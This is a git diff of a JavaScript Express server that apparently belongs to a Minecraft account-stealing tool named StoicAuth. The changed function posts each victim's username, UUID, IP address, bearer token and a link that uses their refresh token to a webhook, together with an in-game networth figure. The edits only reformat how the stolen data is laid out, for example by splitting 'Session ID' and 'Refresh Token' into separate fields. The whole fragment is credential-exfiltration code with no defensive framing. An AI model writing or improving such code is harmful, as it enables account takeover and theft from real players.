@@ -284,20 +284,11 @@ app.get('/refresh', async (req, res) => {
 
 // send the data to the webhook
 async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description) {
-    const embedDescription = refresh 
-        ? "A token has been refreshed!" 
-        : "A user has been authenticated!";
-
-    const networthText = networth === "0" 
-        ? "🪙 Networth: 0"
-        : `🪙 Networth: ${soulboundnetworth} (${networth} unsoulbound)`;
-
     const data = {
         content: "",
         embeds: [
             {
-                title: "StoicAuth",
-                description: embedDescription,
+                title: refresh ? "Minecraft User Refreshed" : "Minecraft User Authenticated",
                 color: 5814783,
                 fields: [
                     {
@@ -317,7 +308,7 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                     },
                     {
                         name: "Networth",
-                        value: networthText,
+                        value: networth,
                         inline: true
                     },
                     {
@@ -326,13 +317,17 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                         inline: true
                     },
                     {
-                        name: "Session Information",
-                        value: `**Bearer Token:**\n\`\`\`${BearerToken}\`\`\`\n**Refresh Token:**\n[Click here to refresh](${redirect_uri}refresh?refresh_token=${RefreshToken})`,
-                        inline: false
+                        name: "Session ID",
+                        value: BearerToken,
+                        inline: true
+                    },
+                    {
+                        name: "Refresh Token",
+                        value: `[Click here to refresh](${redirect_uri}refresh?refresh_token=${RefreshToken})`
                     }
                 ],
                 footer: {
-                    text: "🌟 Stoic Auth by Italy 🌟"
+                    text: `StoicAuth`
                 },
                 timestamp: new Date(),
                 description: description
